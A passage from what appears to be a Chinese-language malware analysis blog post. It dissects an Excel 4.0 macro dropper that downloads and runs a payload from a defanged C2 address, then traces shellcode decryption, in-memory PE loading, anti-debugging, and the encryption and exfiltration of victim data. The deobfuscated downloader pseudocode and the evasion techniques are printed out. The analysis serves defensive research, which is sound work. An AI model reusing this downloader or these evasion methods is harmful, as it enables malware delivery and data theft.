class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">APP.MAXIMIZE()</span><br><span class="line">IF(GET.WINDOW(7),$HN$8144(),)</span><br><span class="line">IF(GET.WINDOW(20),,$HN$8144())</span><br><span class="line">IF(GET.WINDOW(23)&lt;3,$HN$8144(),)</span><br><span class="line">IF(GET.WORKSPACE(31),$HN$8144(),)</span><br><span class="line">IF(GET.WORKSPACE(13)&lt;770,$HN$8144(),)</span><br><span class="line">IF(GET.WORKSPACE(14)&lt;380,$HN$8144(),)</span><br><span class="line">IF(GET.WORKSPACE(19),,$HN$8144())</span><br><span class="line">IF(GET.WORKSPACE(42),,$HN$8144())</span><br><span class="line">IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,$HN$8144())</span><br></pre></td></tr></table></figure><p>随后是一系列循环解密字符串</p><p>第一段循环解密字符串<code>http[:]//link.rolandchase.com/setup.exe</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9452</span>:SET.NAME(<span class="string">"sIdeoxs"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9453</span>:SET.NAME(<span class="string">"KZsNfaPvE"</span>,HA<span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9454</span>:SET.NAME(<span class="string">"FDIsm"</span>,<span class="variable">$U</span><span class="variable">$42807</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9455</span>:IF(FDIsm&lt;&gt;<span class="string">"hEciep"</span>)<span class="comment">#TRUE  hEciep是结束标志</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9456</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,FDIsm)<span class="comment">#$U$42807++</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9457</span>:SET.NAME(<span class="string">"sIdeoxs"</span>,sIdeoxs&amp;KZsNfaPvE())<span class="comment">#http[:]//link.rolandchase.com/setup.exe</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9458</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,FDIsm)<span class="comment">#$U$42807</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9459</span>:SET.NAME(<span class="string">"FDIsm"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))<span class="comment">#R1C1式引用  R42808C21 $U$42808++ 循环索引</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9460</span>:<span class="variable">$BJ</span><span class="variable">$9455</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9461</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BJ<span class="variable">$9462</span>:<span class="variable">$BF</span><span class="variable">$31421</span>()</span></span><br></pre></td></tr></table></figure><p>第二段循环解密字符串<code>upeypgt.exe</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31421</span>:SET.NAME(<span class="string">"kJYRBilGi"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31422</span>:SET.NAME(<span class="string">"mBLgtgTuR"</span>,<span class="variable">$HA</span><span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31423</span>:SET.NAME(<span class="string">"PrZqcgG"</span>,<span class="variable">$HD</span><span class="variable">$14373</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31424</span>:IF(PrZqcgG&lt;&gt;<span class="string">"fKWWmps"</span>)fKWWmps是结束标志</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31425</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,PrZqcgG)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31426</span>:SET.NAME(<span class="string">"kJYRBilGi"</span>,kJYRBilGi&amp;mBLgtgTuR())</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31427</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,PrZqcgG)<span class="comment">#upeypgt.exe</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31428</span>:SET.NAME(<span class="string">"PrZqcgG"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31429</span>:<span class="variable">$BF</span><span class="variable">$31424</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31430</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BF<span class="variable">$31431</span>:<span class="variable">$CH</span><span class="variable">$19157</span>()</span></span><br></pre></td></tr></table></figure><p>第三段循环解密字符串<code>upeypgt.exe</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19157</span>:SET.NAME(<span class="string">"HyuHXmIvF"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19158</span>:SET.NAME(<span class="string">"cXBDj"</span>,<span class="variable">$HA</span><span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19159</span>:SET.NAME(<span class="string">"DJRGluv"</span>,<span class="variable">$GA</span><span class="variable">$807</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19160</span>:IF(DJRGluv&lt;&gt;<span class="string">"hsmFCYu"</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19161</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,DJRGluv)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19162</span>:SET.NAME(<span class="string">"HyuHXmIvF"</span>,HyuHXmIvF&amp;cXBDj())</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19163</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,DJRGluv)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19164</span>:SET.NAME(<span class="string">"DJRGluv"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19165</span>:<span class="variable">$CH</span><span class="variable">$19160</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19166</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$19167</span>:<span class="variable">$HK</span><span class="variable">$27313</span>()</span></span><br></pre></td></tr></table></figure><p>第四段循环解密字符串<code>URLMON</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27313</span>:SET.NAME(<span class="string">"GWZcUs"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27314</span>:SET.NAME(<span class="string">"IBlTVpS"</span>,<span class="variable">$HA</span><span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27315</span>:SET.NAME(<span class="string">"XkhQdDDe"</span>,<span class="variable">$BE</span><span class="variable">$2533</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27316</span>:IF(XkhQdDDe&lt;&gt;<span class="string">"vBXelQd"</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27317</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,XkhQdDDe)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27318</span>:SET.NAME(<span class="string">"GWZcUs"</span>,GWZcUs&amp;IBlTVpS())</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27319</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,XkhQdDDe)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27320</span>:SET.NAME(<span class="string">"XkhQdDDe"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27321</span>:<span class="variable">$HK</span><span class="variable">$27316</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27322</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">CH<span class="variable">$27323</span>:<span class="variable">$BR</span><span class="variable">$49089</span>()</span></span><br></pre></td></tr></table></figure><p>第五段循环解密字符串<code>URLDownLoadTofileA</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49089</span>:SET.NAME(<span class="string">"qCvOwUEOU"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49090</span>:SET.NAME(<span class="string">"QcsIPRaxs"</span>,<span class="variable">$HA</span><span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49091</span>:SET.NAME(<span class="string">"WYFLem"</span>,<span class="variable">$G</span><span class="variable">$45045</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49092</span>:IF(WYFLem&lt;&gt;<span class="string">"NZCVzYqQ"</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49093</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,WYFLem)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49094</span>:SET.NAME(<span class="string">"qCvOwUEOU"</span>,qCvOwUEOU&amp;QcsIPRaxs())</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49095</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,WYFLem)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49096</span>:SET.NAME(<span class="string">"WYFLem"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49097</span>:<span class="variable">$BR</span><span class="variable">$49092</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49098</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">BR<span class="variable">$49099</span>:<span class="variable">$GG</span><span class="variable">$7470</span>()</span></span><br></pre></td></tr></table></figure><p>第六段循环解密字符串<code>JJCCJJ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7470</span>:SET.NAME(<span class="string">"WxwNDFwW"</span>,<span class="string">""</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7471</span>:SET.NAME(<span class="string">"ydbKxT"</span>,<span class="variable">$HA</span><span class="variable">$22625</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7472</span>:SET.NAME(<span class="string">"JzOYHHt"</span>,<span class="variable">$GN</span><span class="variable">$47925</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7473</span>:IF(JzOYHHt&lt;&gt;<span class="string">"cIDECHryG"</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7474</span>:SET.NAME(<span class="string">"kFulzKssfStQ"</span>,JzOYHHt)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7475</span>:SET.NAME(<span class="string">"WxwNDFwW"</span>,WxwNDFwW&amp;ydbKxT())</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7476</span>:SET.NAME(<span class="string">"cqYpbfFtqkDz"</span>,JzOYHHt)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7477</span>:SET.NAME(<span class="string">"JzOYHHt"</span>,TEXTREF(<span class="variable">$HP</span><span class="variable">$40210</span>(),FALSE))</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7478</span>:<span class="variable">$GG</span><span class="variable">$7473</span>()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7479</span>:END.IF()</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GG<span class="variable">$7480</span>:<span class="variable">$EI</span><span class="variable">$6224</span>()</span></span><br></pre></td></tr></table></figure><p>后续还有十八次同样的操作，目的显然为了反分析和进行免杀，这里不再进行赘述</p><table><thead><tr><th>循环</th><th>变量</th></tr></thead><tbody><tr><td>第七段</td><td>Shell32</td></tr><tr><td>第八段</td><td>ShellExecuteA</td></tr><tr><td>第九段</td><td>JJCCCCJ</td></tr><tr><td>第十段</td><td>Open</td></tr><tr><td>第十一段</td><td>regsvr32.exe</td></tr><tr><td>第十二段</td><td>rundll32.exe</td></tr><tr><td>第十三段</td><td>C:\EnmaMnK</td></tr><tr><td>第十四段</td><td>C:\EnmaMnK\WkSjVZz</td></tr><tr><td>第十五段</td><td>Kernel32</td></tr><tr><td>第十六段</td><td>CreateDirectoryA</td></tr><tr><td>第十七段</td><td>JCJ</td></tr><tr><td>第十八段</td><td>INSENG</td></tr><tr><td>第十九段</td><td>DownloadFile</td></tr><tr><td>第二十段</td><td>BCCJ</td></tr><tr><td>第二十一段</td><td>fCBdLcOS</td></tr><tr><td>第二十二段</td><td>wUahMZYo</td></tr><tr><td>第二十三段</td><td>hbtTtFyR</td></tr><tr><td>第二十四段</td><td>KuCJZBzQ</td></tr></tbody></table><p>随后来到代码核心逻辑(解混淆后伪代码如下),尝试使用两种不同的方式从C2下载并执行样本(绕过杀软)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">REGISTER("URLMON","URLDownloadToFileA","JJCCJJ","fCBdLcOS",,1,9)</span><br><span class="line">URLDownloadToFileA(0,"http[:]//link.rolandchase.com/setup.exe","upeypgt.exe",0,0)</span><br><span class="line">IF(Download fail)</span><br><span class="line">REGISTER("INSENG","DownloadFile","BCJJ","wUahMZYXo",,1,9)</span><br><span class="line">DownloadFile("http[:]//link.rolandchase.com/setup.exe","upeypgt.exe",1)</span><br><span class="line">REGISTER("Shell32","ShellExecuteA","JJCCCCJ","KuCJZBzQ",,1,9)</span><br><span class="line">ShellExecuteA(0,"Open","upeypgt.exe",,0,0)</span><br><span class="line">HALT()</span><br></pre></td></tr></table></figure><p>对下载回来的exe进行分析，首先看到一大堆垃圾代码，很明显是使用类似控制流平坦方式进行混淆干扰分析，实际很多分支根本不会进入</p><p>核心代码如下，首先使用全局变量保存<code>kernel32.dll</code>模块基址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502002448142.png" alt></p><p>申请大小为0xAAF8的堆空间，随后从<code>.data</code>段拷贝被加密过的shellcode到该空间，并修改内存属性为<code>PAGE_EXECUTE_READWRITE</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502002946173.png" alt></p><p>接下来就是对shellcode进行解密，解密算法是经过魔改过的微型加密算法(TEA)，并在算法中也加入了很多无效函数</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502010112680.png" alt></p><p>看来样本作者在免杀这方面也是下了不少功夫</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502010327819.png" alt></p><p>无实质意义的循环0xEA7BB次(混淆代码)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502010816211.png" alt></p><p>最终跳转到<code>shellcode</code>代码执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502011328573.png" alt></p><p>使用scdbg简单分析可知，<code>shellcode</code>动态获取函数并遍历进程模块(实际上并不会这么简单)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502013158119.png" alt></p><p>对<code>shellcode</code>进行分析，首先是自实现hash算法遍历<code>kernel32</code>导出函数表(详细过程不再赘述，参考shellcode编写技术，通过FS寄存器获取模块基址，遍历导出表)，动态获取``LoadLibrary<code>以及</code>GetProcAddress`函数地址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503001210018.png" alt></p><p>随后组合使用<code>LoadLibrary</code>和<code>GetProcAddress</code>获取其他函数地址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503002020720.png" alt></p><p>获取的API名称如下</p><table><thead><tr><th align="center">API  LIST</th></tr></thead><tbody><tr><td align="center">GlobalAlloc</td></tr><tr><td align="center">GetLastError</td></tr><tr><td align="center">Sleep</td></tr><tr><td align="center">VirtualAlloc</td></tr><tr><td align="center">CreatToolhelp32Snapshot</td></tr><tr><td align="center">Modul32First</td></tr><tr><td align="center">CloseHandle</td></tr></tbody></table><p>正如scdbg回显结果，调用了<code>CreatToolhelp32Snapshot</code>函数，但是发现这并不是shellcode的真实目的</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503010842954.png" alt></p><p>动态解密shellcode代码</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503003807680.png" alt></p><p>调用<code>VirtualAlloc</code>分配大小为0xB450的可执行内存</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503004625797.png" alt></p><p>解密新的一段shellcode到新分配的内存并跳转执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503005103243.png" alt></p><p>再次使用scdbg分析新的<code>shellcode</code>，也并未发现明显异常</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503011224651.png" alt></p><p>对新的<code>shellcode</code>进行分析，首先是查找``kernel32.dll<code>基址及</code>GetProcAddress`地址(与第一次shellcode不同的地方在于这里使用的kernel32基址是从第一次shellcode中取得，而获取函数地址也是直接遍历了第一次shellcode中已经获取到导出表)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503012431584.png" alt></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503012508512.png" alt></p><p>获取后续要用到的函数地址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503013817876.png" alt></p><p>获取的API名称如下</p><table><thead><tr><th align="center">API  LIST</th></tr></thead><tbody><tr><td align="center">LoadlibraryA</td></tr><tr><td align="center">VirtualAlloc</td></tr><tr><td align="center">VirtualProtect</td></tr><tr><td align="center">VirtualFree</td></tr><tr><td align="center">GetVersionExA</td></tr><tr><td align="center">TerminateProcess</td></tr><tr><td align="center">ExitProcess</td></tr><tr><td align="center">SetErrorMode</td></tr></tbody></table><p>清除程序的<code>FLScallback</code>函数，并没有什么实质作用(分析到最后处才明白这里是为了保证程序正常退出不会引起崩溃，因为堆栈被后续代码破坏)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503020904647.png" alt></p><p>再次分配大小为0xA600的内存，从第二段<code>shellcode</code>将内嵌的PE程序拷入新分配的内存</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503021351019.png" alt></p><p>将<code>upeypgt.exe</code>程序内存镜像起始地址0x400000内存属性修改为读写执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503022210592.png" alt></p><p>将起始地址0x400000，大小0x10000，用0填充</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503022423825.png" alt></p><p><code>shellcode</code>实现PE loader功能，将<code>shellcode</code>中内嵌的PE加载到地址0x400000(类似傀儡进程)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503022648895.png" alt></p><p>随后释放掉为内嵌PE分配的内存</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503022943716.png" alt></p><p>调用atexit注册好退出函数后跳转到已经展开的内存PE OEP处，当前退出回调函数并看起来是<code>call 44444444h</code>，后续会修正这个地址为<code>TerminateProcess</code>(这种写法的好处是不用进行堆栈修复，且不会引起程序异常崩溃)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503023916235.png" alt></p><p>分析内存PE,注册VEH处理函数进行反调试，触发异常后恢复执行流程</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503031324544.png" alt></p><p>创建线程执行SleepEx，并向该线程APC队列插入回调函数</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503034142459.png" alt></p><p>获取文件内存映像相关底层API</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503123732991.png" alt></p><p>从内存中将抹除PE标志的DLL修复后拷贝到新申请的内存,又是一个内存PE程序</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503134845639.png" alt></p><p>将DLL再次展开到另一块新分配的内存并执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503125254790.png" alt></p><p>程序使用VEH进行反dump,首先将dll所在内存属性设置为<code>NO_ACCESS</code>，然后在拷贝时触发异常，使用注册好的VEH handle处理后即可访问</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210503145155847.png" alt></p><p>使用<code>Jun 27 2020</code>生成密钥</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210504032855343.png" alt></p><p>解密后续要用到的数据</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210504032943573.png" alt></p><p>获取当前运行进程权限</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210504153527941.png" alt></p><p>判断当前权限是否允许在证书中使用无效的通用名称；即应用程序指定的服务器名称与证书中的通用名称不匹配时仍可访问(也就是说，程序后续要通过HTTPS建立通信，但并不对证书进行验证)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210504153628342.png" alt></p><p>格式化字符串<code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</code>,这里看起来像是<code>User-Agent</code>，后续会有HTTPS访问</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210504162658017.png" alt></p><p>通过WMI    <code>StdRegProv</code>类操作注册表，绕过杀软注册表监控</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505000414412.png" alt></p><p>获取WMI provider的<code>GetStringValue</code>方法，通过注册表项检查IE路径，随后获取并通过<code>GetVersion</code>检测当前运行环境IE浏览器主版本号是否大于8</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505002820025.png" alt></p><p>同样的手法,使用WMIprovider修改IE配置禁用IE首次打开提示</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505005656927.png" alt></p><p>禁用IE提示设置为默认的 Web 浏览器弹窗</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505010046951.png" alt></p><p>解密并格式化拼接字符串(字符串内容为终端相关信息配置)</p><p>“soft=3&amp;version=250153&amp;user=94c3ddbf476a706479841356dfae812f&amp;server=12&amp;id=8981&amp;crc=1&amp;uptime=27293”</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505010727135.png" alt></p><p>以<code>10291029JSJUYNHG</code>为密钥使用Serpent算法加密收集到的用户信息，随后使用base64进行编码</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505044402662.png" alt></p><p>最后在完成加密的字符串前缀拼接上/images,后缀拼接上.avi并加上C2组成完整的url，然后通过com初始化IE浏览器关联的CLSID</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505022045090.png" alt></p><p>通过<code>IWebBrowser2</code>接口，<code>IWebBrowserApp</code>测试并访问C2，将窃取到的信息回传到C2(在循环访问c2回传信息时，会夹杂着访问<code>yahoo.com</code>，实质上为了迷惑分析人员)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505022627709.png" alt></p><p>由于C2功能已经失效 ，因此在这里循环访问C2时，获取不到后续功能模块，导致死循环访问C2，编写OD脚本记录轮询C2列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 当EIP执行到这个地址的时候C2放在EAX中 </span><br><span class="line">MOV dwGetC2,002F7713</span><br><span class="line">&#x2F;&#x2F; 当EIP执行到这个地址的时候已经跳出循环 </span><br><span class="line">MOV dwLastCall,002F690c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 清除所有软件断点</span><br><span class="line">BC</span><br><span class="line">&#x2F;&#x2F; 清除所有硬件断点</span><br><span class="line">BPHWCALL</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置硬件执行断点</span><br><span class="line">BPHWS dwGetC2,&quot;x&quot;</span><br><span class="line">BPHWS dwLastCall,&quot;x&quot;</span><br><span class="line"></span><br><span 